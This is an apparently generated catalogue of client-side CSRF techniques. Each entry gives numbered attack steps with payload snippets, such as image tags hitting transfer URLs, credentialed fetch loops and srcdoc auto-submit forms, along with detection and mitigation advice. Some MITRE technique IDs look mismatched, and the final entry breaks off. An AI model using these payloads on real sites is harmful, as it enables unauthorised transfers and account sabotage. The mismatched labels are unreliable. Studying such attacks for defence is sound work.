# Browser Security → Client-Side CSRF Attacks

## CSRF via Hidden JavaScript Form Auto-Submit

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Authenticated users
- **Vulnerability**: No CSRF token or origin check
- **MITRE**: T1530
- **Impact**: Unauthorized actions on user’s behalf
- **Tools**: Burp Suite, Live HTTP Headers
- **Scenario**: Inject JS that silently submits forms to authenticated endpoints
- **Attack Steps**: 1. The attacker identifies a banking site (bank.com) that allows money transfers via POST requests from authenticated users. 2. They craft a malicious site with a hidden HTML form targeting https://bank.com/transfer. 3. The form contains pre-filled fields (e.g., to=attacker&amount=1000). 4. A short JavaScript snippet (form.submit()) is executed immediately when the page loads. 5. If a logged-in user visits the attacker’s page, the browser automatically sends the request using existing session cookies. 6. The bank processes the transaction without requiring additional user verification. 7. The victim remains unaware as no UI is shown. 8. The attacker repeatedly lures victims via phishing or embedded content to exploit authenticated sessions.
- **Detection**: Monitor cross-origin form submissions
- **Solution**: Use CSRF tokens and SameSite cookies
- **Tags**: #csrf #javascriptform #autopost

## CSRF Using Image Tag GET Request

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Sites using GET for critical actions
- **Vulnerability**: Unprotected GET endpoints
- **MITRE**: T1530
- **Impact**: Silent fund transfer or action trigger
- **Tools**: <img>, GET endpoint
- **Scenario**: Auto-load image with sensitive GET params to trigger action
- **Attack Steps**: 1. The attacker finds a vulnerable GET endpoint: https://bank.com/transfer?to=attacker&amount=500. 2. They embed an <img> tag in their own malicious site: <img src="https://bank.com/transfer?to=attacker&amount=500">. 3. When a logged-in user visits the malicious page, the browser automatically loads the image, unknowingly making the GET request. 4. Since the request includes the user’s session cookie, the bank interprets it as a valid transfer. 5. No image will be shown (response isn't a real image), but the action completes. 6. This method requires no JavaScript, making it stealthy and widely compatible. 7. Attackers use forums, ads, or phishing emails to lure users into loading the malicious page. 8. The success depends on the server incorrectly using GET for state-changing actions.
- **Detection**: Log and alert unexpected GET requests
- **Solution**: Use POST with CSRF tokens for all critical actions
- **Tags**: #csrf #getrequest #imgattack

## CSRF via JavaScript Fetch() to Internal API

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Internal API endpoints
- **Vulnerability**: No origin or referrer check
- **MITRE**: T1530
- **Impact**: Silent API abuse
- **Tools**: JS Fetch API, Custom API
- **Scenario**: Send cross-origin fetch to internal app endpoint using cookies
- **Attack Steps**: 1. The attacker targets a vulnerable webmail app that exposes /api/delete-email?id=123 and uses cookies for auth. 2. On their malicious site, they embed JavaScript like fetch("https://webmail.com/api/delete-email?id=123", {method: "GET", credentials: "include"}). 3. If a logged-in user visits the attacker’s site, this script runs automatically. 4. The browser includes authentication cookies while making the request. 5. The server processes the delete request, thinking it's a legit user action. 6. No CORS errors occur because the attacker does not try to read the response, only send the request. 7. This causes destructive behavior without requiring user interaction. 8. Attackers exploit endpoints that trust cookie-based sessions and lack origin validation.
- **Detection**: Monitor CORS-less API calls from other origins
- **Solution**: Validate request origin and use CSRF tokens
- **Tags**: #fetchcsrf #cookieleak #clientattack

## CSRF via Auto-Submitting Invisible Iframe

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Web applications using POST without CSRF validation
- **Vulnerability**: Cookie trust without iframe control
- **MITRE**: T1530
- **Impact**: Background execution of critical actions
- **Tools**: <iframe>, Auto Form Submit
- **Scenario**: Inject invisible iframe to auto-trigger POST action
- **Attack Steps**: 1. The attacker creates a malicious HTML page with an invisible <iframe> element pointing to a money transfer form on https://target.com. 2. Inside the iframe, a pre-filled form is auto-submitted using JavaScript (form.submit()). 3. Since the user is logged into the target site, the browser sends cookies with the request. 4. The action completes (e.g., money transferred, password changed) without user interaction. 5. The victim sees only a blank or unrelated page. 6. Multiple iframes can be used to trigger several parallel actions. 7. The attacker cycles iframe URLs with random delays to avoid detection. 8. Exploits the fact that browsers trust iframe POSTs from authenticated sessions.
- **Detection**: Monitor iframe-originating POSTs
- **Solution**: Use CSRF tokens, X-Frame-Options headers
- **Tags**: #iframecsrf #autosubmit #websecurity

## GET-Based CSRF in IoT Web Interface

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Home router or IoT interfaces
- **Vulnerability**: No session timeout or CSRF defense
- **MITRE**: T1530
- **Impact**: Full network redirection
- **Tools**: Smart Camera Panel
- **Scenario**: Trigger device config change via URL on image load
- **Attack Steps**: 1. An attacker finds that a smart camera admin panel changes DNS settings via: GET /setDNS?ip=8.8.8.8. 2. They craft a phishing site with an image tag: <img src="http://192.168.0.10/setDNS?ip=attacker.com">. 3. If the victim is connected to their home network and logged in, the image tag forces the DNS change. 4. This silently redirects all future traffic via the attacker's DNS server. 5. Since many IoT panels lack authentication after login, the change happens without prompts. 6. No CORS is triggered because it’s a GET request with no response reading. 7. This kind of CSRF can hijack traffic and inject phishing or MITM content. 8. Attackers use public forums or phishing emails to distribute the exploit.
- **Detection**: Track internal requests triggered via GET
- **Solution**: Use local-only access or auth for config changes
- **Tags**: #iotcsrf #getform #dnsattack

## CSRF via Single-Origin Misuse in Webmail

- **Attack Type**: Single Origin Session Misuse
- **Target**: Browser tabs running same-origin logic
- **Vulnerability**: Insecure postMessage or opener usage
- **MITRE**: T1136
- **Impact**: Cross-tab manipulation
- **Tools**: Mail App + JS
- **Scenario**: Relies on SOP to trick app into trusting cross-tab actions
- **Attack Steps**: 1. The attacker hosts a phishing page resembling a note-taking web app. 2. When visited, the JS code opens a hidden tab pointing to webmail.com. 3. This tab remains idle while the attacker uses window.opener or postMessage to send commands. 4. The target app (webmail) processes messages under the assumption it’s from the same origin (due to incorrect SOP validation). 5. As a result, the webmail app deletes emails, changes settings, or sends messages without confirmation. 6. This works if the webmail interface incorrectly trusts all messages or doesn’t verify origins. 7. The user sees nothing unusual — the malicious tab is invisible or mimics a legitimate window. 8. SOP is bypassed due to flawed implementation logic, not policy error.
- **Detection**: Validate origin in message handling
- **Solution**: Use strict message origin and tab scoping
- **Tags**: #tabcsrf #singleoriginabuse #sopmisuse

## CSRF via Pre-Filled GET Link on Social Media

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: User profiles on GET-exposed services
- **Vulnerability**: Action via GET without auth challenge
- **MITRE**: T1530
- **Impact**: Account loss or reputation damage
- **Tools**: Social Embed, GET URL
- **Scenario**: Triggers account deletion using embedded URL
- **Attack Steps**: 1. An attacker posts a shortened link on social media like: http://malicious.com/delete. 2. That link redirects to https://site.com/deleteAccount?confirm=yes. 3. A logged-in user who clicks the link unknowingly triggers account deletion. 4. The action is processed because it uses a GET request with no confirmation prompt. 5. Since the user voluntarily clicked the link, no browser warning is shown. 6. Attackers exploit trust in social platforms to push such destructive links. 7. The attacker may use Bit.ly or other URL shorteners to obscure the real destination. 8. Without anti-CSRF validation, the server processes the action silently.
- **Detection**: Alert on sensitive actions over GET
- **Solution**: Require POST and reauthentication
- **Tags**: #getcsrf #linkattack #socialphishing

## CSRF via Unauthenticated Admin Panel in Printer UI

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Local embedded admin panels
- **Vulnerability**: No authentication for critical actions
- **MITRE**: T1530
- **Impact**: Printer disruption, data loss
- **Tools**: Embedded Print UI
- **Scenario**: Change settings via local IP + hidden image tag
- **Attack Steps**: 1. A network printer has a config panel at http://192.168.1.100/admin. 2. No login is required once the user accesses it from the internal network. 3. An attacker sends a phishing page containing an image: <img src="http://192.168.1.100/admin/resetSettings">. 4. When the victim loads the page, their browser triggers a GET request to the printer panel. 5. The printer resets settings silently, disrupting business workflows. 6. Since the victim's browser has local network access, the image load succeeds. 7. No feedback is given, making detection difficult. 8. This kind of client-side CSRF is especially dangerous on local embedded devices.
- **Detection**: Require credentials even on internal requests
- **Solution**: Disable GET-based admin actions
- **Tags**: #csrfprinter #internalcsrf #networkdevice

## CSRF via Auto Form in Malicious Extension

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Victims with malicious browser extensions
- **Vulnerability**: Extension-level DOM injection
- **MITRE**: T1176
- **Impact**: Persistent CSRF across sessions
- **Tools**: Malicious Extension
- **Scenario**: Extension injects hidden form into authenticated site
- **Attack Steps**: 1. A rogue browser extension runs on all sites and injects a hidden form into target banking domains. 2. The form contains transfer instructions and is submitted automatically via JS. 3. Since the user is logged in, cookies are included, and the action executes. 4. The extension requires permissions to access all tabs, allowing it to target any domain. 5. Victims don’t see the form because it’s injected invisibly. 6. The attacker can use the extension to scan for known banking domains and adapt payloads accordingly. 7. This technique makes CSRF attacks persistent and scalable. 8. It also avoids detection as browser logs don’t show the malicious site.
- **Detection**: Restrict extension permissions
- **Solution**: Detect DOM changes from untrusted extensions
- **Tags**: #extensioncsrf #forminject #browserabuse

## CSRF via Invisible Clickbait Download Page

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Users visiting sketchy download sites
- **Vulnerability**: Auto-triggered API calls using sessions
- **MITRE**: T1530
- **Impact**: Financial loss, session abuse
- **Tools**: Clickbait Site
- **Scenario**: Fake download page triggers transfer on load
- **Attack Steps**: 1. A site claims to offer “free cracked software” and hosts a download button. 2. Clicking the button opens a hidden iframe or loads a JS script that triggers a CSRF to bank.com/transfer. 3. The script contains a hidden auto-submit form or fetch request. 4. Because the victim is already logged in, the transfer is executed silently. 5. Users see a fake download dialog or ad pop-up to distract from the real action. 6. The attacker rotates domain names and obfuscates JS to avoid blacklisting. 7. Even if the victim leaves the page quickly, the CSRF already executes. 8. Download-themed attacks exploit curiosity and poor CSRF defenses.
- **Detection**: Analyze behavior of auto forms
- **Solution**: Harden critical endpoints with CSRF protection
- **Tags**: #csrfclickbait #autotransfer #downloadtrap

## CSRF via HTML5 Audio Element Source

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Media-capable web apps
- **Vulnerability**: Insecure GET-based API
- **MITRE**: T1530
- **Impact**: Silent deletion or action
- **Tools**: HTML5 Audio
- **Scenario**: Triggers unauthorized GET request via <audio> tag
- **Attack Steps**: 1. An attacker discovers that an online calendar service has a GET endpoint to delete events via https://calendar.com/delete?id=1234. 2. They host a malicious page containing: <audio src="https://calendar.com/delete?id=1234" autoplay hidden></audio>. 3. When a logged-in victim visits the attacker's page, the audio tag attempts to load the source URL. 4. The browser automatically sends the request using the victim's cookies, assuming it's just loading media. 5. The server processes the delete request without confirmation. 6. Since audio won’t play and the tag is hidden, the user doesn’t notice. 7. This method bypasses many traditional CSRF protections that look for form-based POSTs. 8. It exploits the fact that any media tag source can initiate a GET request.
- **Detection**: Flag unusual GET requests from media elements
- **Solution**: Require POST + CSRF tokens for changes
- **Tags**: #html5csrf #mediacsrf #audiotagattack

## CSRF via <object> Tag Trigger

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Web apps allowing GET for destructive actions
- **Vulnerability**: Lack of CSRF validation on GET
- **MITRE**: T1530
- **Impact**: Data deletion or configuration reset
- **Tools**: <object>, HTTP
- **Scenario**: Embeds an object tag with a malicious GET URL
- **Attack Steps**: 1. An attacker creates a malicious HTML page and embeds <object data="https://mail.com/deleteAll">. 2. The tag attempts to fetch and render the object, triggering the URL in the background. 3. If the victim is logged into mail.com, the request is sent with their cookies. 4. The target server deletes all emails or data without prompting the user. 5. Since <object> tags are often used for embedding, they attract little suspicion. 6. The action occurs in the background, with no visual indication. 7. Many sites still process GET requests that modify data, making them vulnerable. 8. This demonstrates how even legacy HTML elements can enable CSRF.
- **Detection**: Monitor unexpected object fetches
- **Solution**: Block GET-based state changes
- **Tags**: #objectcsrf #legacyhtml #stealthyattack

## CSRF via POST from Hidden Auto-Submitted Form

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Authenticated web portals
- **Vulnerability**: No CSRF protection for POSTs
- **MITRE**: T1530
- **Impact**: Profile hijacking
- **Tools**: JavaScript, HTML Form
- **Scenario**: Uses hidden form with POST to modify account data
- **Attack Steps**: 1. The attacker builds a form with hidden inputs that modify a victim’s profile on https://profile.com. 2. The form is configured with method="POST" and contains fields like name, email, and password. 3. On page load, JavaScript executes document.forms[0].submit() automatically. 4. Since the victim is logged in, the browser includes session cookies. 5. The request appears legitimate to the server. 6. The form is visually hidden with CSS (display:none) so the user never sees it. 7. This type of CSRF works when the server fails to check referrer or CSRF tokens. 8. Attackers use this for silent account takeovers or phishing pivots.
- **Detection**: Monitor POSTs without valid CSRF token
- **Solution**: Enforce token checks + SameSite cookies
- **Tags**: #formcsrf #autopostattack #profileedit

## CSRF via XMLHttpRequest in Inline JavaScript

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Web wallets and finance tools
- **Vulnerability**: No origin/referrer validation
- **MITRE**: T1530
- **Impact**: Unauthorized financial action
- **Tools**: XMLHttpRequest, JS
- **Scenario**: Uses XHR with session cookies to call critical endpoints
- **Attack Steps**: 1. An attacker hosts a malicious webpage that includes inline JavaScript. 2. The script uses var xhr = new XMLHttpRequest(); xhr.open("POST", "https://wallet.com/send", true); and sends preset values. 3. The request includes withCredentials=true, ensuring cookies are included. 4. Once the victim loads the page while logged in, the action is executed silently. 5. The wallet sends money to the attacker without the user clicking anything. 6. The browser does not display alerts or prompt the user. 7. This classic CSRF uses built-in browser trust in JS APIs. 8. Many older services do not validate the origin header, making this attack effective.
- **Detection**: Inspect XHR origin and referrer headers
- **Solution**: Use CSRF tokens and origin checks
- **Tags**: #xhrcsrf #sendmoney #csrfwallet

## CSRF via window.name Session Sharing

- **Attack Type**: Single Origin Session Misuse
- **Target**: Legacy apps using window.name
- **Vulnerability**: Trusting session tokens from window scope
- **MITRE**: T1136
- **Impact**: Forced login or impersonation
- **Tools**: JS + Frame Misuse
- **Scenario**: Exploits shared window.name for injecting credentials
- **Attack Steps**: 1. The attacker creates a popup or iframe and sets window.name = "sessionid=ABC123". 2. Then, they redirect the iframe to https://intranet.company.com, which reads window.name assuming it's a legitimate internal value. 3. The attacker tricks the app into accepting this session and logs in as another user. 4. Many legacy web apps use window.name to store temporary session info. 5. Since it persists across redirects and origins, it becomes a CSRF vector. 6. This attack does not require cookies or cross-site scripting. 7. Only one tab interaction is needed to poison the session. 8. Exploiting shared window properties is often overlooked in modern security checks.
- **Detection**: Avoid using window.name for sessions
- **Solution**: Use secure cookies and scoped storage
- **Tags**: #windowname #sessionpoison #csrfmemory

## CSRF via Bookmarklet Triggered Requests

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Any authenticated web platform
- **Vulnerability**: Executable bookmarklets with cookie scope
- **MITRE**: T1530
- **Impact**: Silent destructive actions
- **Tools**: Bookmarklet, JavaScript
- **Scenario**: Uses malicious bookmarklet to send background request
- **Attack Steps**: 1. The attacker convinces the user to install a bookmarklet promising functionality like “dark mode” or “quick scan.” 2. When the victim clicks it while logged into a secure site, it runs: fetch("https://secure.com/delete?target=123", {credentials: "include"}). 3. The request executes in the background using the victim’s cookies. 4. The action is completed instantly without any page reload. 5. Bookmarklets run in the context of the current page, enabling attacks on trusted domains. 6. Attackers share malicious bookmarklets disguised as productivity tools. 7. Since the user runs the code willingly, browser security does not block it. 8. This technique abuses the user’s trust and session state.
- **Detection**: Warn users about bookmarklet use on sensitive sites
- **Solution**: Restrict powerful actions to POST + token
- **Tags**: #bookmarkcsrf #silentattack #userdrivencsrf

## CSRF via Social Engineering + LocalStorage Abuse

- **Attack Type**: JavaScript-Based API Calls
- **Target**: SPAs and client-heavy web apps
- **Vulnerability**: Insecure trust in localStorage
- **MITRE**: T1530
- **Impact**: Forced authentication or session hijack
- **Tools**: JavaScript, Browser Storage
- **Scenario**: Uses localStorage value injection to trigger requests
- **Attack Steps**: 1. The attacker lures a user into visiting a page that sets a specific localStorage key like sessionToken=XYZ. 2. Then they redirect the user to another tab or site that loads a script reading from localStorage to authenticate a request. 3. If the target site reuses localStorage keys insecurely, it treats the user as authenticated. 4. The attacker can now trigger requests using the forged token. 5. This attack works especially well in Single Page Applications that trust stored session data. 6. No cookies are required—just stored values. 7. The exploit is silent and doesn’t require a reload. 8. It bridges trust between domains via shared storage misuse.
- **Detection**: Validate token origin and scope
- **Solution**: Store sessions securely, not in localStorage
- **Tags**: #localstorage #csrftokenabuse #spasecurity

## CSRF via Embedded <video> Source

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Admin panels with GET APIs
- **Vulnerability**: Lack of endpoint confirmation
- **MITRE**: T1530
- **Impact**: Silent deactivation or banning
- **Tools**: HTML5 Video Tag
- **Scenario**: Loads destructive URL through video tag
- **Attack Steps**: 1. The attacker embeds a hidden <video> tag on a malicious site like <video src="https://site.com/disableUser?id=123" autoplay muted></video>. 2. When a logged-in user visits, the browser sends a GET request to the target endpoint to load the “video.” 3. The server executes the action (e.g., disable account) due to lack of validation. 4. The user sees nothing because the tag is hidden and muted. 5. This allows attacks without JavaScript or visible UI. 6. It abuses the behavior of multimedia tags making GET requests. 7. The attacker can rotate target parameters for batch actions. 8. This technique is effective against legacy endpoints using GET for admin actions.
- **Detection**: Block sensitive GET endpoints from media loading
- **Solution**: Use POST + CSRF tokens only
- **Tags**: #videocsrf #html5abuse #invisibleattack

## CSRF via Dynamic Form Injection by Ad Script

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Sites showing unvetted ads
- **Vulnerability**: Malicious ad scripts targeting auth cookies
- **MITRE**: T1530
- **Impact**: Session hijack via ads
- **Tools**: Ad Service JS, DOM APIs
- **Scenario**: Ad JS loads form into DOM and submits silently
- **Attack Steps**: 1. A malicious ad served via 3rd-party ad network includes JavaScript. 2. The script creates a form targeting https://bank.com/pay?to=attacker, fills values, and auto-submits. 3. The form is inserted into the DOM using document.body.appendChild(). 4. As soon as the DOM is ready, the JS submits the form. 5. If the user is logged in, the browser attaches cookies and completes the transfer. 6. The ad iframe or banner looks normal while performing the attack. 7. This allows CSRF via cross-site ad inclusion. 8. No user action is required—just loading the ad triggers it.
- **Detection**: Validate and sandbox ad content
- **Solution**: Disallow sensitive APIs from ad-loaded DOM
- **Tags**: #adcsrf #forminjection #thirdpartyabuse

## CSRF via Popunder Tab and Preloaded Payload

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Victims browsing popunder-heavy sites
- **Vulnerability**: Delayed form injection via tab
- **MITRE**: T1530
- **Impact**: Account deletion or sabotage
- **Tools**: Popunder JS, Stealth Tab
- **Scenario**: Preloads POST payload in invisible tab behind main window
- **Attack Steps**: 1. The attacker launches a popunder window via JavaScript triggered by user interaction. 2. The popunder tab opens an innocent page but then navigates silently to a CSRF payload page. 3. The new page contains an auto-submitting form targeting https://target.com/profile/delete. 4. Since it's in a background tab, the user doesn't notice anything. 5. The form runs form.submit() and sends session cookies. 6. The action is completed without visual clue. 7. This method chains interaction with stealth execution. 8. Often used in adult or pirated content sites to bypass attention.
- **Detection**: Block window manipulation from ads
- **Solution**: Require confirmation on critical actions
- **Tags**: #popunderattack #csrfpopup #silentpayload

## CSRF via JavaScript Polling Loop

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Authenticated user session
- **Vulnerability**: Poor origin validation, no rate limit
- **MITRE**: T1530
- **Impact**: Resource exhaustion, spam, data loss
- **Tools**: JavaScript, setInterval
- **Scenario**: Uses repeated requests in a loop to trigger multiple API calls silently
- **Attack Steps**: 1. An attacker crafts a malicious site that includes a hidden script using setInterval() to send fetch requests every few seconds. 2. The script looks like: setInterval(() => { fetch("https://app.com/api/delete?msg=123", {credentials: "include"}) }, 3000);. 3. When a logged-in user visits this site, their browser begins silently sending the request every 3 seconds. 4. This could result in multiple deletions, spam submissions, or wallet drains depending on the endpoint. 5. The user remains unaware as no output or UI is visible. 6. The technique abuses the JavaScript event loop and timing to execute CSRF over time. 7. Because each request includes session cookies, it is treated as a valid authenticated action. 8. It demonstrates how CSRF can persist over time without refreshing or form use.
- **Detection**: Detect suspicious repeated API activity
- **Solution**: Apply origin checks, token validation, and rate-limiting
- **Tags**: #loopcsrf #timedrequest #apiabuse

## CSRF via Form Pre-Fill and Page Onload Trigger

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Profile management forms
- **Vulnerability**: Missing CSRF tokens and SameSite cookie
- **MITRE**: T1530
- **Impact**: Account tampering
- **Tools**: HTML Forms, JS
- **Scenario**: A pre-filled form submits via onload without interaction
- **Attack Steps**: 1. The attacker builds a page with an HTML form targeting https://site.com/updateProfile. 2. Inputs like email=new@mail.com, name=attacker are pre-filled. 3. The page body includes onload="document.forms[0].submit()" so the form submits immediately when the page loads. 4. A logged-in victim visiting this page causes their profile to be silently modified. 5. No JavaScript is visibly invoked, and the user sees no visual indicators. 6. This works due to the browser trusting cookie-based sessions. 7. No CSRF token means no validation or challenge happens. 8. The attack succeeds even if the user closes the tab quickly.
- **Detection**: Detect form activity without user interaction
- **Solution**: Require POST with valid tokens
- **Tags**: #prefillcsrf #silentupdate #cookieexploit

## CSRF via Cross-Domain Service Worker Registration

- **Attack Type**: Single Origin Session Misuse
- **Target**: Sites allowing SW on broad scope
- **Vulnerability**: Misused service worker registration
- **MITRE**: T1136
- **Impact**: Cross-site control over user actions
- **Tools**: Service Workers, JS
- **Scenario**: Tricked service worker controls requests from victim site
- **Attack Steps**: 1. An attacker creates a phishing domain fake-login.com mimicking a popular site. 2. They inject a malicious service worker on that domain via JS registration. 3. The victim visits the phishing page, which also embeds real-site.com in an iframe. 4. Due to misconfigured service worker scope or domain policies, the worker ends up intercepting requests to real-site.com. 5. The service worker injects fetch requests or form data to critical endpoints. 6. It can now silently control or redirect requests using session cookies. 7. This allows advanced CSRF or MITM-like control over actions without leaving the page. 8. It relies on flawed browser domain separation or bad CSP configuration.
- **Detection**: Monitor unexpected SW registrations
- **Solution**: Restrict scope and validate request origin
- **Tags**: #csrfworker #crossorigin #servicemisuse

## CSRF via Image Beacon in PDF File

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Ecommerce platforms
- **Vulnerability**: GET endpoints for state change
- **MITRE**: T1530
- **Impact**: Resource spam, DoS via autofill
- **Tools**: PDF File, HTML Payload
- **Scenario**: Loads hidden image in PDF viewed in browser
- **Attack Steps**: 1. The attacker embeds an <img> tag with a malicious GET URL in a PDF file. 2. The image points to something like https://store.com/addToCart?item=999. 3. When the PDF is viewed inside the browser (via viewer), the image auto-loads. 4. Since the browser sends the session cookies, the item is added to the user’s cart. 5. The victim may not even notice unless they check the cart manually. 6. The attacker could automate spam orders or inflate cart values. 7. This attack vector is useful in phishing documents sent via email. 8. The trick works because embedded resources in PDFs load like normal HTML in-browser.
- **Detection**: Block embedded image actions
- **Solution**: Don’t allow GET for user-impacting actions
- **Tags**: #pdfcsrf #imagebeacon #cartstuffing

## CSRF via Malicious Browser Extension API Injection

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Users with infected browsers
- **Vulnerability**: Browser extension abuse
- **MITRE**: T1176
- **Impact**: Fake posts, data exposure
- **Tools**: Malicious Extension
- **Scenario**: Extension makes silent requests using elevated tab privileges
- **Attack Steps**: 1. A rogue browser extension declares tabs, webRequest, and storage permissions. 2. Once installed, it checks if tabs are open for https://social.com. 3. If found, it injects JS into the page to silently submit a post form with POST /api/status. 4. It uses stored credentials and session cookies passed by the browser. 5. The victim unknowingly makes public posts or sends messages. 6. This type of CSRF abuses trusted internal APIs from the context of browser power. 7. Extensions can also modify DOMs or inject fetch calls directly. 8. The damage is significant due to the persistent and trusted nature of extensions.
- **Detection**: Audit extensions and tab access
- **Solution**: Restrict dangerous extension APIs
- **Tags**: #extensioncsrf #apipush #tabexploit

## CSRF via Sandbox Escape using srcdoc in Iframe

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Modern web apps
- **Vulnerability**: Misused iframe sandbox
- **MITRE**: T1530
- **Impact**: Account or data deletion
- **Tools**: HTML5, <iframe srcdoc>
- **Scenario**: Injects HTML using iframe srcdoc to bypass sandbox
- **Attack Steps**: 1. The attacker sets up a webpage with a hidden iframe using <iframe sandbox srcdoc="<form action='https://site.com/deleteAccount' method='POST'><input name='confirm' value='yes'></form><script>document.forms[0].submit()</script>">. 2. The srcdoc attribute directly injects HTML into the iframe. 3. Although sandboxed, browsers allow certain inline scripts to run. 4. This causes auto-submission of the form from within the iframe. 5. If the victim is logged in, session cookies are sent. 6. The deletion action is processed silently. 7. It bypasses some X-Frame protections due to the inline sandboxed nature. 8. Advanced CSRF vectors like this demonstrate how HTML5 features can introduce risk.
- **Detection**: Validate all requests regardless of frame
- **Solution**: Harden iframe sandboxing behavior
- **Tags**: #srcdoccsrf #sandboxbypass #html5security

## CSRF via window.opener Frame Control

- **Attack Type**: Single Origin Session Misuse
- **Target**: Any tabbed browser sessions
- **Vulnerability**: Unrestricted opener access
- **MITRE**: T1136
- **Impact**: Redirect-based CSRF
- **Tools**: window.opener
- **Scenario**: New tab changes parent tab's location to CSRF URL
- **Attack Steps**: 1. The attacker creates a phishing site that opens site.com in a new tab. 2. Due to window.opener being accessible, they call window.opener.location = "https://site.com/logout" or a CSRF URL. 3. The parent tab (victim's session) is now redirected to the attacker-defined endpoint. 4. The action is executed silently using the active session. 5. This can lead to logouts, transfers, deletions depending on URL. 6. The user only sees a sudden redirect with no explanation. 7. The attacker can also open multiple tabs and redirect all of them. 8. Mitigation involves severing window.opener using rel=noopener.
- **Detection**: Enforce rel=noopener on links
- **Solution**: Sanitize JS opener access
- **Tags**: #tabcsrf #openerattack #redirectcsrf

## CSRF via DNS Rebind to Internal Admin Panel

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Internal localhost panels
- **Vulnerability**: No host-based CSRF protection
- **MITRE**: T1530
- **Impact**: Destructive internal actions
- **Tools**: DNS Rebind Tools
- **Scenario**: Rebinds hostname to 127.0.0.1 to reach internal app
- **Attack Steps**: 1. The attacker registers malicious.com and points its DNS A record to an external server. 2. After initial victim visit, the attacker changes the DNS to resolve to 127.0.0.1. 3. JS running in the victim’s browser on malicious.com can now access http://127.0.0.1:8080 (e.g., local admin panel). 4. It sends a fetch request to http://127.0.0.1:8080/resetAll. 5. The victim’s browser treats the request as same-origin since the hostname hasn’t changed. 6. The internal app executes the destructive action using default trust. 7. DNS rebinding bypasses origin policies using dynamic IP resolution. 8. This vector enables CSRF-like actions against internal services.
- **Detection**: Block internal IP access from public hostnames
- **Solution**: Enforce origin header checks
- **Tags**: #dnsrebindcsrf #localhostabuse #internalattack

## CSRF via QR Code Payload

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: GET-exposed ecommerce sites
- **Vulnerability**: Misuse of GET for actions
- **MITRE**: T1530
- **Impact**: Unauthorized actions from QR
- **Tools**: QR Generator, GET APIs
- **Scenario**: QR links point to harmful GET requests
- **Attack Steps**: 1. The attacker encodes a URL like https://ecomm.com/cart?add=item123 into a QR code. 2. The QR is shared via poster, email, or WhatsApp as a “discount link.” 3. When a logged-in user scans it, their mobile browser opens the link and sends a GET request. 4. The item is added to the cart or order is placed automatically. 5. If the site uses GET for sensitive actions, this triggers silent operations. 6. QR delivery makes CSRF stealthier and harder to detect. 7. The attacker repeats the method across different campaigns. 8. CSRF via QR is rising due to mobile-first browsing habits.
- **Detection**: Restrict GET for critical endpoints
- **Solution**: Educate users on safe QR scanning
- **Tags**: #qrcsrf #mobilecsrf #urlpayload

## CSRF via Mobile App WebView Abuse

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Mobile apps with embedded WebViews
- **Vulnerability**: Implicit trust on mobile sessions
- **MITRE**: T1530
- **Impact**: Silent actions on user’s behalf
- **Tools**: Android WebView
- **Scenario**: Mobile app loads attacker page in WebView with active session
- **Attack Steps**: 1. An attacker creates an Android app that opens a hidden WebView pointing to https://secure.com/pay?to=attacker. 2. When the app runs, the WebView inherits the browser’s session cookies. 3. The GET or POST request executes immediately within WebView using the victim’s credentials. 4. The user is unaware that the WebView exists. 5. It can also run auto-submitting forms in JS inside WebView. 6. If the app is disguised as a utility tool or game, it is often installed willingly. 7. Since WebViews are full browsers, they execute CSRF like desktop ones. 8. Detection is hard unless server logs include user agents and suspicious IPs.
- **Detection**: Log WebView UAs, validate origin
- **Solution**: Block mobile-origin CSRF with tokens
- **Tags**: #mobilecsrf #webviewabuse #inappattack

## CSRF via Autoplaying <video> Tag

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Web apps allowing GET for critical actions
- **Vulnerability**: No CSRF validation on media loads
- **MITRE**: T1530
- **Impact**: Account disabling without user consent
- **Tools**: HTML5 Video
- **Scenario**: Video tag makes hidden GET request to change server state
- **Attack Steps**: 1. An attacker sets up a malicious HTML page that contains <video src="https://site.com/disableUser?id=123" autoplay muted style="display:none;"></video>. 2. When a logged-in victim visits the page, the browser attempts to load and play the video file. 3. The request to the video source URL is a regular GET, and since the user is authenticated, cookies are sent automatically. 4. If the server does not enforce CSRF protection and allows GET requests to modify state (e.g., disabling a user), the action succeeds. 5. There is no alert or visible indication to the user that an action was triggered. 6. This tactic abuses the fact that media tags like <video> can fetch remote content silently. 7. Attackers often hide the tag with CSS and autoplay muted to avoid user suspicion. 8. It's particularly effective on poorly designed APIs that don’t validate methods or referrers.
- **Detection**: Monitor unusual GETs from media tag headers
- **Solution**: Require CSRF token and disallow GET for state change
- **Tags**: #html5csrf #videocsrf #stealthattack

## CSRF via Auto-Submitted Invisible Iframe

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Banking or transactional apps
- **Vulnerability**: POST endpoint without CSRF token
- **MITRE**: T1530
- **Impact**: Unauthorized financial transaction
- **Tools**: HTML Iframe, JavaScript
- **Scenario**: Loads a hidden iframe with a form that posts onload
